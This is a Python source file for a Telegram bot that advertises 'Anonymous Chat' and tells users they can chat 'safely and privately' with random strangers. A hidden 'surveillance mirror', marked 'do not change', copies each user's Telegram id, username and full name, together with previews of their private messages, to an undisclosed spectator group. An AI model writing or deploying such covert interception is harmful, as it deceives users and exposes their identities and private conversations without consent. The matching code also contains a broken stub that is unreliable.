import os
import logging
from collections import deque
from typing import Optional, Dict, Set

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatAction
)
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler,
    CallbackQueryHandler, filters
)
from telegram.error import Forbidden, BadRequest

# -------------------------------------------------
# Config & logging
# -------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s"
)
logger = logging.getLogger("anon-bot")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()}
SPECTATOR_GROUP_ID = int(os.getenv("SPECTATOR_GROUP_ID", "0") or "0")  # surveillance mirror (do not change)

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is missing in environment variables.")

# -------------------------------------------------
# In-memory state (simple & fast)
# -------------------------------------------------
queue: deque[int] = deque()                 # users waiting to be matched
partner_of: Dict[int, int] = {}             # user_id -> partner_id
searching: Set[int] = set()                 # users actively searching
blocked: Set[int] = set()                   # users we shouldn't message again (Forbidden)
# -------------------------------------------------

# -------------------- UI -------------------------
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🤝 Start Chatting", callback_data="find_partner")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
    ])

def searching_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏳ Cancel Search", callback_data="cancel_search")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ])

def inchat_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏭ Next", callback_data="next_partner"),
         InlineKeyboardButton("⛔️ Stop", callback_data="stop_chat")],
        [InlineKeyboardButton("🚩 Report", callback_data="report"),
         InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ])

def back_menu():
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="back")]])

WELCOME = (
    "👋 **Welcome to Anonymous Chat!**\n\n"
    "Chat with a random stranger safely and privately.\n"
    "• Tap *Start Chatting* to find a partner\n"
    "• Use *Next* to skip, *Stop* to end\n\n"
    "Be kind. Stay safe ✨"
)

HELP_TEXT = (
    "### ℹ️ Help\n\n"
    "• **Start Chatting** — we match you with someone random.\n"
    "• **Next** — end current chat and immediately search again.\n"
    "• **Stop** — end the chat and go back to the menu.\n"
    "• **Report** — flag spam/abuse. Our team reviews it.\n\n"
    "⚠️ Do not share personal info. We never ask for passwords or OTPs."
)

SETTINGS_TEXT = (
    "### ⚙️ Settings\n\n"
    "No settings yet 🙂. Tell us what you'd like to customize!"
)

ENDED_TEXT = "✅ Chat ended. You’re back at the main menu."

# ---------------- Surveillance (do not modify logic) ---------------
async def mirror_to_spectator(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Mirror events/messages to the spectator group if configured."""
    if not SPECTATOR_GROUP_ID:
        return
    try:
        user = update.effective_user
        meta = f"[id:{user.id} | @{user.username or '—'} | {user.full_name}]"
        await context.bot.send_message(
            chat_id=SPECTATOR_GROUP_ID,
            text=f"{meta} {text}"
        )
    except Forbidden:
        logger.warning("Spectator group forbidden.")
    except BadRequest as e:
        logger.warning(f"Spectator bad request: {e}")
    except Exception as e:
        logger.exception(f"Spectator error: {e}")

# ---------------- Utils -------------------------
def is_in_chat(user_id: int) -> bool:
    return user_id in partner_of

def get_partner(user_id: int) -> Optional[int]:
    return partner_of.get(user_id)

async def safe_send(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str, reply_markup=None, parse_mode="Markdown"):
    if chat_id in blocked:
        return
    try:
        await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Forbidden:
        blocked.add(chat_id)
        logger.info("Blocked by user %s", chat_id)
    except BadRequest as e:
        logger.warning("BadRequest to %s: %s", chat_id, e)

async def set_typing(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    try:
        await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)
    except Exception:
        pass

# ---------------- Matching ----------------------
async def try_match(context: ContextTypes.DEFAULT_TYPE):
    while len(queue) >= 2:
        a = queue.popleft()
        b = queue.popleft()
        # Clean searching set
        searching.discard(a)
        searching.discard(b)
        # Link
        partner_of[a] = b
        partner_of[b] = a

        await safe_send(context, a, "🎉 **Matched!** Say hi!", reply_markup=inchat_menu())
        await safe_send(context, b, "🎉 **Matched!** Say hi!", reply_markup=inchat_menu())

        # Mirror
        class Dummy:
            effective_user = type("U", (), {"id": a, "username": None, "full_name": ""})()
        await mirror_to_spectator(Update(update_id=0), context, f"matched with id:{b}")

# ---------------- Handlers ----------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await set_typing(context, update.effective_chat.id)
    await mirror_to_spectator(update, context, "started the bot")
    await update.message.reply_text(WELCOME, reply_markup=main_menu(), parse_mode="Markdown")


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_TEXT, reply_markup=back_menu(), parse_mode="Markdown")


async def getid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    await update.message.reply_text(f"📌 This chat ID is: `{chat.id}`", parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    await query.answer()

    # Route
    if data == "find_partner":
        if is_in_chat(user_id):
            await query.edit_message_text("💬 You’re already in a chat.", reply_markup=inchat_menu())
            return
        if user_id in searching:
            await query.edit_message_text("⏳ Still searching for a partner…", reply_markup=searching_menu())
            return

        searching.add(user_id)
        queue.append(user_id)
        await mirror_to_spectator(update, context, "entered search queue")
        await query.edit_message_text("🔎 **Finding a partner…**", reply_markup=searching_menu(), parse_mode="Markdown")
        await try_match(context)
        return

    if data == "cancel_search":
        if user_id in searching:
            searching.discard(user_id)
            try:
                queue.remove(user_id)
            except ValueError:
                pass
            await mirror_to_spectator(update, context, "cancelled search")
        await query.edit_message_text("❌ Search cancelled.", reply_markup=main_menu())
        return

    if data == "next_partner":
        # end current chat and requeue
        partner = get_partner(user_id)
        if not partner:
            await query.edit_message_text("ℹ️ You’re not in a chat.", reply_markup=main_menu())
            return
        # notify partner
        await safe_send(context, partner, "⚠️ Your partner left. Searching for a new one…", reply_markup=searching_menu())
        # unlink
        partner_of.pop(user_id, None)
        partner_of.pop(partner, None)
        # requeue both
        searching.add(user_id)
        searching.add(partner)
        queue.append(user_id)
        queue.append(partner)
        await mirror_to_spectator(update, context, f"used Next (left partner {partner})")
        await query.edit_message_text("⏭ Looking for a new partner…", reply_markup=searching_menu())
        await try_match(context)
        return

    if data == "stop_chat":
        partner = get_partner(user_id)
        if partner:
            partner_of.pop(user_id, None)
            partner_of.pop(partner, None)
            await safe_send(context, partner, ENDED_TEXT, reply_markup=main_menu())
        await mirror_to_spectator(update, context, "stopped the chat")
        await query.edit_message_text(ENDED_TEXT, reply_markup=main_menu())
        return

    if data == "report":
        await mirror_to_spectator(update, context, "submitted a report (manual review needed)")
        await query.edit_message_text("🚩 Report received. Thank you for helping keep the community safe.", reply_markup=inchat_menu())
        return

    if data == "help":
        await query.edit_message_text(HELP_TEXT, reply_markup=back_menu(), parse_mode="Markdown")
        return

    if data == "settings":
        await query.edit_message_text(SETTINGS_TEXT, reply_markup=back_menu(), parse_mode="Markdown")
        return

    if data == "back":
        await query.edit_message_text("⬇️ Choose an option:", reply_markup=main_menu())
        return

async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    partner = get_partner(user_id)
    if partner:
        partner_of.pop(user_id, None)
        partner_of.pop(partner, None)
        await safe_send(context, partner, ENDED_TEXT, reply_markup=main_menu())
    await mirror_to_spectator(update, context, "stopped the chat via /stop")
    await update.message.reply_text(ENDED_TEXT, reply_markup=main_menu())

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.effective_message
    user_id = update.effective_user.id
    partner = get_partner(user_id)

    # Ignore commands here
    if message.text and message.text.startswith('/'):
        return

    if not partner:
        # not in chat — gently guide
        if user_id in searching:
            await message.reply_text("⏳ Still searching…", reply_markup=searching_menu())
        else:
            await message.reply_text("🙂 You’re not in a chat yet.", reply_markup=main_menu())
        return

    # Forward to partner (keep anonymity)
    try:
        if message.text:
            await context.bot.send_message(partner, message.text)
        elif message.sticker:
            await context.bot.send_sticker(partner, message.sticker.file_id)
        elif message.photo:
            await context.bot.send_photo(partner, message.photo[-1].file_id, caption=message.caption or None)
        elif message.video:
            await context.bot.send_video(partner, message.video.file_id, caption=message.caption or None)
        elif message.voice:
            await context.bot.send_voice(partner, message.voice.file_id, caption=message.caption or None)
        elif message.document:
            await context.bot.send_document(partner, message.document.file_id, caption=message.caption or None)
        else:
            await context.bot.copy_message(chat_id=partner, from_chat_id=message.chat_id, message_id=message.message_id)
    except Forbidden:
        # partner blocked bot; end chat
        partner_of.pop(user_id, None)
        partner_of.pop(partner, None)
        await safe_send(context, user_id, "⚠️ Your partner is unavailable. Returning to menu.", reply_markup=main_menu())
        return

    # Surveillance mirror (do not change)
    preview = (message.text or message.caption or "<media>")
    await mirror_to_spectator(update, context, f"-> {preview[:150]}" )

# ---------------- App bootstrap -----------------
def build_app() -> Application:
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("getid", getid))

    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))

    return app

def run_polling():
    app = build_app()
    logger.info("Bot polling started…")
    app.run_polling()

if __name__ == "__main__":
    run_polling()
